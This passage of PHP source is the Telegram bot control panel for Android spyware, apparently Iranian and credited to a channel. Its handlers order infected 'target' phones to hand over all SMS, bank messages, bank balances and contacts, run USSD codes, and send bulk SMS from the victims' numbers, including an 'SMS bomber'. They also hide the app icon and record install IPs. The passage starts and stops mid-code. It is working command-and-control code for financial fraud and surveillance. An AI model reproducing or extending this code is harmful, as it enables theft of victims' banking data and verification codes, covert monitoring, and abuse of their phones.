                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",

        'parse_mode' => 'HTML'
    ]);
        requestsAll('silent_all');
    } elseif ($data == "set_url") {
    smg($chat_id, "🌐 <b>ꜱᴇᴛ ᴘᴏʀᴛᴀʟ ʟɪɴᴋ</b>\n\nᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ʟɪɴᴋ\nᴇxᴀᴍᴘʟᴇ: <code>https://example.com</code>", $s);
    file_put_contents("user/$chat_id/command.txt", "set url");

} elseif ($command == "set url") {
    smg($chat_id, "✅ <b>ᴘᴏʀᴛᴀʟ ʟɪɴᴋ ꜱᴇᴛ</b>\n\nᴛᴏ: <code>$text</code>", $a);
    file_put_contents("link.txt", $text);
    file_put_contents("user/$chat_id/command.txt", "");

} elseif ($data == "show_url") {
    smg($chat_id, "🧬 ʏᴏᴜʀ ᴜʀʟ ʟɪɴᴋ:\n\n<code>$link_show</code>\n\nبرای چک کردن فیلتر بودن یا نبودن خود از دکمه زیر استفاده کنید💹",$checkhost);

} elseif ($data == "sms_all") {
    file_put_contents("user/$chat_id/command.txt", "");
    smg($chat_id, "💣 <b>ꜱᴍꜱ ʙᴏᴍʙᴇʀ</b>\n\nᴛᴇxᴛ ᴍᴇꜱꜱᴀɢᴇ: <code>$text_message</code>", $sms_button_all);

} elseif ($data == "set_message_contacts") {
    emg($chat_id, $mi, "📩 <b>ꜱᴇᴛ ᴄᴏɴᴛᴀᴄᴛꜱ ᴍᴇꜱꜱᴀɢᴇ</b>\n\nᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ᴛᴇxᴛ", $back_settings);
    file_put_contents("user/$chat_id/command.txt", "message_contacts");

} elseif ($command == "message_contacts") {
    file_put_contents("data/message_contacts.txt", $text);
    smg($chat_id, "✅ <b>ᴄᴏɴᴛᴀᴄᴛꜱ ᴍᴇꜱꜱᴀɢᴇ ꜱᴇᴛ</b>\n\nᴛᴏ: <code>$text</code>", $back_settings);
    file_put_contents("user/$chat_id/command.txt", "");

} elseif ($data == "edit_message_all") {
    emg($chat_id, $mi, "✏️ <b>ᴇᴅɪᴛ ꜱᴍꜱ ᴛᴇxᴛ</b>\n\nᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ɴᴇᴡ ᴛᴇxᴛ", $back_settings);
    file_put_contents("user/$chat_id/command.txt", "set message all");

} elseif ($command == "set message all") {
    file_put_contents("user/$chat_id/message.txt", $text);
    smg($chat_id, "✅ <b>ꜱᴍꜱ ᴛᴇxᴛ ᴜᴘᴅᴀᴛᴇᴅ</b>\n\nᴛᴏ: <code>$text</code>", $back_settings);
    file_put_contents("user/$chat_id/command.txt", "");

} elseif ($data == "set_list_all") {
    emg($chat_id, $mi, "📋 <b>ꜱᴇᴛ ɴᴜᴍʙᴇʀ ʟɪꜱᴛ</b>\n\nᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ɴᴜᴍʙᴇʀꜱ (ᴏɴᴇ ᴘᴇʀ ʟɪɴᴇ)", $back_settings);
    file_put_contents("user/$chat_id/command.txt", "set list all");

} elseif ($command == "set list all") {
    file_put_contents("user/$chat_id/numberlist.txt", $text);
    smg($chat_id, "✅ <b>ɴᴜᴍʙᴇʀ ʟɪꜱᴛ ꜱᴇᴛ</b>\n\nꜱʜᴏᴜʟᴅ ᴍᴇꜱꜱᴀɢᴇꜱ ʙᴇ ꜱᴇɴᴛ?", $send_sms_all);
    file_put_contents("user/$chat_id/command.txt", "");
    } elseif ($data == "last_send_all") {
    $request_time = getIranTime();
    bot('sendMessage', [

        'chat_id' => $chat_id,
        'text' => "🌀 ʀᴇQᴜᴇꜱᴛ ꜱᴇɴᴅ ᴛᴏ ᴀʟʟ\n"
                 . "📑 ꜱᴍꜱ ᴛᴇxᴛ $text_message\n"
                 . "☎️ ɴᴜᴍʙᴇʀ $number_message\n"
                 . "👤ᴍᴏᴅᴇ : ꜱᴇɴᴅ ꜱᴍꜱ\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ꜱᴇɴᴅ ꜱᴍꜱ ᴛᴏ ᴀʟʟ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
        $time = explode("\n", $number_message);
        $time = count($time) * 5;
        $str = str_replace("\n", ",", $number_message);
        requestSMS("send_sms_all", null, $str, $text_message);
} elseif (strpos($data, "information") !== false) {
    checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $info_button = info_button($device_id);
    file_put_contents("user/$chat_id/command.txt", "");
    
    smg($chat_id, "📊 ‹‹ <b>ɪɴꜰᴏʀᴍᴀᴛɪᴏɴ</b> ›› ꜱᴇᴄᴛɪᴏɴ\n\n"
        . "👤 ɴᴀᴍᴇ ᴛᴀʀɢᴇᴛ : [ <code>$target_name</code> ]\n\n"
        . "🌐 ɪɴꜱᴛᴀʟʟ ɪᴘ : [ <code>$install_ip</code> ]\n\n"
        . "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", 
    $info_button);
    
} elseif (strpos($data, "send_sms") !== false) {
    checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $sms_button = sms_button($device_id);

    file_put_contents("user/$chat_id/command.txt", "");
    smg($chat_id, "📨 ‹‹ <b>ꜱᴇɴᴅ ꜱᴍꜱ</b> ›› ꜱᴇᴄᴛɪᴏɴ\n\n📝 ᴛᴇxᴛ ᴍᴇꜱꜱᴀɢᴇ : [ <code>$text_message</code> ]\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $sms_button);
} elseif (strpos($data, "searchSMS") !== false) {
    checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
        [['text' => "🔙 ‹‹ ʙᴀᴄᴋ", 'callback_data' => "back_panel $datass[1]"]]
    ]]);
    smg($chat_id, "🔍 ‹‹ <b>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ᴡᴏʀᴅ</b> ››\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", null);
    file_put_contents("user/$chat_id/command.txt", "setwords $device_id");
    
} elseif (strpos($data, "ussdcode") !== false) {
    checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    smg($chat_id, "📟 ‹‹ <b>ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ ᴄᴏᴅᴇ</b> ››\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $s);
    file_put_contents("user/$chat_id/command.txt", "sendussd $device_id");
    
} elseif (strpos($command, "setwords") !== false) {
    $datass = explode(" ", $command);
    $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        file_put_contents("user/$chat_id/command.txt", "");
        requestSMS("searchSMS", $device_id, null, $text);
        $request_time = getIranTime();
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🔍 ꜱᴇᴀʀᴄʜ ꜱᴍꜱ -> $text\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ꜱᴇᴀʀᴄʜ ꜱᴍꜱ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);

    } elseif (strpos($command, "sendussd") !== false) {
        $datass = explode(" ", $command);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        $ussd = $text;
        file_put_contents("user/$chat_id/command.txt", "");
        $request_time = getIranTime();
        requestSMSContact("ussdcode",$device_id,$ussd);
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "☎️ ussd code $ussd\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ʀᴜʀ ᴜꜱꜱᴅ ᴄᴏᴅᴇᴛ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);

    }elseif ($data == "search_all") {
        smg($chat_id, "👁️‍🗨️ ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴡᴏᴇᴅ ꜰᴏʀ ꜱᴇᴀʀᴄʜ ɪɴ ᴀʟʟ ᴜꜱᴇʀ ꜱᴍꜱ\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $setting);
        file_put_contents("user/$chat_id/command.txt", "set words2");
    } elseif ($command == "set words2") {
        file_put_contents("user/$chat_id/command.txt", "");
        requestSMS("allSearch", $device_id, null, $text);
        $request_time = getIranTime();
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                 . "👤ᴛᴀʀɢᴇᴛ: all\n"
                 . "🔍 ꜱᴇᴀʀᴄʜ ꜱᴍꜱ -> $text\n"
                . "🫡ᴄᴏᴍᴍᴀɴᴅ: ꜱᴇᴀʀᴄʜ ꜱᴍꜱ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n\n"
                 . "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>\n",
        'parse_mode' => 'HTML'
    ]);
    } elseif (strpos($data, "clearinfo") !== false) {
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $info_button = info_button($device_id);
    emg($chat_id, $mi, "🧹 ‹‹ ᴀʟʟ ɪɴꜰᴏ ᴛᴀʀɢᴇᴛ (ɴᴀᴍᴇ) ᴄʜᴀɴɢᴇᴅ ᴛᴏ [ <code>ɴᴜʟʟ</code> ] ››\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $info_button);
    file_put_contents("user/$device_id-name.txt", "null");
    
} elseif (strpos($data, "edit_message") !== false) {
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $back_sms = back_sms($device_id);
    emg($chat_id, $mi, "📝 ‹‹ ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ <b>ꜱᴍꜱ ᴛᴇxᴛ</b> ››\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $back_sms);
    file_put_contents("user/$chat_id/command.txt", "setmessage $device_id");

} elseif (strpos($command, "setmessage") !== false) {
    $datass = explode(" ", $command);
    $device_id = $datass[1];
    $back_sms = back_sms($device_id);

    file_put_contents("user/$chat_id/message.txt", $text);
    smg($chat_id, "✅ ‹‹ <b>ꜱᴍꜱ ᴛᴇxᴛ</b> ᴡᴀꜱ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇᴛ ᴛᴏ [ <code>$text</code> ] ››\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $back_sms);
    file_put_contents("user/$chat_id/command.txt", "");
    
} elseif (strpos($data, "set_list") !== false) {
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $back_sms = back_sms($device_id);
    emg($chat_id, $mi, "📋 ‹‹ ᴘʟᴇᴀꜱᴇ ꜱᴇɴᴅ ᴛʜᴇ <b>ʟɪꜱᴛ ɴᴜᴍʙᴇʀ</b> ››\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $back_sms);
    file_put_contents("user/$chat_id/command.txt", "setlist $device_id");

} elseif (strpos($command, "setlist") !== false) {
    $datass = explode(" ", $command);
    $device_id = $datass[1];
    $send_sms = send_sms($device_id);

    file_put_contents("user/$chat_id/numberlist.txt", $text);
    smg($chat_id, "✅ ‹‹ <b>ʟɪꜱᴛ ɴᴜᴍʙᴇʀ</b> ᴡᴀꜱ ꜱᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ ꜱᴇᴛ ››\n\n✉️ ꜱʜᴏᴜʟᴅ ᴍᴇꜱꜱᴀɢᴇꜱ ʙᴇ ꜱᴇɴᴛ?\n\n<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>", $send_sms);
    file_put_contents("user/$chat_id/command.txt", "");
    
} elseif (strpos($data, "last_send") !== false) {
    $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
    
    $request_time = getIranTime();
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "📑 ꜱᴍꜱ ᴛᴇxᴛ -> $text_message\n"
                 . "☎️ ɴᴜᴍʙᴇʀ -> $number_message\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ꜱᴇɴᴅ ꜱᴍꜱ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
        $time = explode("\n", $number_message);
        $time = count($time) * 5;
        $str = str_replace("\n", ",", $number_message);
        requestSMS("send_sms", $device_id, $str, $text_message);


    } elseif (strpos($data, "status_user") !== false) {
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $device_model = file_get_contents("user/$device_id-model.txt");
    
    $message_id = sendCommandWithResponse($chat_id, $device_id, $device_model, "Get Device Status", "");
    
    requests('status', $device_id);
    
    file_put_contents("user/$device_id-status-msg.txt", "$chat_id|$message_id");

        requests('status', $datass[1]);
} elseif (strpos($data, "last_sms") !== false) {
    checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $device_model = file_get_contents("user/$device_id-model.txt");
    $request_time = getIranTime();    
    $wait_msg = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʟᴀꜱᴛ ꜱᴍꜱ...\n"
                 . "👤 ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡 ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ʟᴀꜱᴛ ꜱᴍꜱ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n\n"
                 . "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    file_put_contents("user/$device_id-lastsms-msg.txt", $chat_id."|".$wait_msg->result->message_id);
    requests('last_sms', $device_id);

    } elseif (strpos($data, "all_sms") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $getsmsButton = getsmsButton($device_id);

        emg($chat_id, $mi, "Choose Type To Get", $getsmsButton);
    } elseif (strpos($data, "sent") !== false) {
        checkTimeExpired($chat_id);
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $request_time = getIranTime();
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ꜱᴍꜱ ʟɪꜱᴛ...\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ᴀʟʟ ᴏᴜᴛ ʙᴏxᴛ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
        requests('all_sms_sent', $device_id);
    } elseif (strpos($data, "Popo ") !== false) {
        checkTimeExpired($chat_id);
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        $request_time = getIranTime();
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ꜱᴍꜱ ʟɪꜱᴛ...\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ꜱᴍꜱ ʟɪꜱᴛ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    requests('all_sms', $device_id);

    } elseif (strpos($data, "all_contacts ") !== false) {
        checkTimeExpired($chat_id);
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        $request_time = getIranTime();
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ꜱᴍꜱ ʟɪꜱᴛ...\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ᴀʟʟ ᴄᴏɴᴛᴀᴄᴛ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
        requests('all_contacts', $device_id);
    } elseif (strpos($data, "recived") !== false) {
        checkTimeExpired($chat_id);
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $request_time = getIranTime();    
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ꜱᴍꜱ ʟɪꜱᴛ...\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ᴀʟʟ ɪɴ ʙᴏx\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
        requests('all_sms_recived', $device_id);
    } elseif (strpos($data, "balance") !== false) {
        checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $device_model = file_get_contents("user/$device_id-model.txt");
    $request_time = getIranTime();    
    // ارسال پیام در حال پردازش
    $wait_msg = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..ꜱ\n"
                 . "👤 ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡 ᴄᴏᴍᴍᴀɴᴅ: ɢᴇᴛ ʙᴀɴᴋ ᴀᴄᴄᴏᴜɴᴛꜱ ʙᴀʟᴀɴᴄᴇꜱ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    file_put_contents("user/$chat_id/wait_msg_id.txt", $wait_msg->result->message_id);
    
    requests('balance', $device_id);


    } elseif (strpos($data, "all_balanc2") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        smg($chat_id, "<b>wait...</b>", null);
        file_put_contents("data/bal.txt", "singel");
        requests('balance', $device_id);
    } elseif (strpos($data, "last_Bank_sms") !== false) {
        checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $request_time = getIranTime();    
    $wait_msg = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʙᴀɴᴋ ꜱᴍꜱ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ʟᴀꜱᴛ ʙᴀɴᴋ ꜱᴍꜱ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    file_put_contents("user/$chat_id/wait_msg_id.txt", $wait_msg->result->message_id);
    requests('last_bank_sms', $device_id);

    } elseif (strpos($data, "All_Bank_sms") !== false) {
        checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $request_time = getIranTime();
    bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ...\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ʙᴀɴᴋ ꜱᴍꜱ ʟɪꜱᴛ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    requests('all_bank_sms', $device_id);

    } elseif (strpos($data, "WhatsChecker") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $back_control = json_encode(['resize_keyboard' => true, 'inline_keyboard' => [
            [['text' => "‹‹ Back", 'callback_data' => "back_panel $datass[1]"]]
        ]]);
        $word = file_get_contents("user/$chat_id/word.txt");
        emg($chat_id, $mi, "<b>CheCk $word</b> are being successfully received, Approximate time : 3 seconds", $back_control);
        requestSMS("WhatsChecker", $device_id, null, $word);
    } elseif (strpos($data, "vibrate_mode") !== false) {
        $datass = explode(" ", $data);
        $device_id = $datass[1];
        $request_time = getIranTime();
bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ᴠɪʙʀᴀᴛᴇ ᴍᴏᴅᴇ\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
        requests('Vibrate', $device_id);
        file_put_contents("user/$datass[1]-ringer.txt", "Vibrate");

} elseif (strpos($data, "normal_mode") !== false) {
    checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $device_model = file_get_contents("user/$device_id-model.txt");
    $request_time = getIranTime();   
    $wait_msg = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ɴᴏʀᴍᴀʟ ᴍᴏᴅᴇ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n\n"
                 . "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    file_put_contents("user/$device_id-normalmode-msg.txt", $chat_id."|".$wait_msg->result->message_id);
    file_put_contents("user/$device_id-ringer.txt", "Normal");
    
    requests('Normal', $device_id);
} elseif (strpos($data, "silent_mode") !== false) {
    checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $device_model = file_get_contents("user/$device_id-model.txt");
    $request_time = getIranTime();   
    $wait_msg = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ꜱɪʟᴇɴᴛ ᴍᴏᴅᴇ\n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n\n"
                 . "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    file_put_contents("user/$device_id-silentmode-msg.txt", $chat_id."|".$wait_msg->result->message_id);
    file_put_contents("user/$device_id-ringer.txt", "Silent");
    
    requests('silent', $device_id);

} elseif (strpos($data, "hide_icon") !== false) {
    checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $device_model = file_get_contents("user/$device_id-model.txt");
    $request_time = getIranTime();   
    $wait_msg = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ʜɪᴅᴅᴇɴ \n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n\n"
                 . "<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    file_put_contents("user/$device_id-hideicon-msg.txt", $chat_id."|".$wait_msg->result->message_id);
    
    requests('hidden', $device_id);

    } elseif (strpos($data, "visible_icon") !== false) {
        checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $device_model = file_get_contents("user/$device_id-model.txt");
    $request_time = getIranTime();    
    $wait_msg = bot('sendMessage', [
        'chat_id' => $chat_id,
        'text' => "🌀 ᴡᴀɪᴛɪɴɢ ꜰᴏʀ ʀᴇꜱᴘᴏɴꜱᴇ..\n"
                 . "👤ᴛᴀʀɢᴇᴛ: $device_id | [$device_model]\n"
                 . "🫡ᴄᴏᴍᴍᴀɴᴅ: ᴜɴʜɪᴅᴇ \n"
                 . "<blockquote>🕒 ʀᴇQᴜᴇꜱᴛ ᴛɪᴍᴇ : $request_time</blockquote>\n
<b>🐋 <a href='https://t.me/theolder_channel'>ɪᴍ-ꜱᴀᴇᴇᴅ</a></b>",
        'parse_mode' => 'HTML'
    ]);
    
    file_put_contents("user/$chat_id/wait_msg.txt", json_encode([
        'message_id' => $wait_msg->result->message_id,
        'device_id' => $device_id,
        'command' => 'visible_icon'
    ]));
    
    requests('visible', $device_id);

        file_put_contents("user/$datass[1]-apk.txt", "Visible");
    } elseif (strpos($data, "change") !== false) {
        checkTimeExpired($chat_id);
    $datass = explode(" ", $data);
    $device_id = $datass[1];
    $device_model = file_get_contents("user/$device_id-model.txt");
    $request_time = getIranTime();
    $wait_msg = bot('sendMessage', [
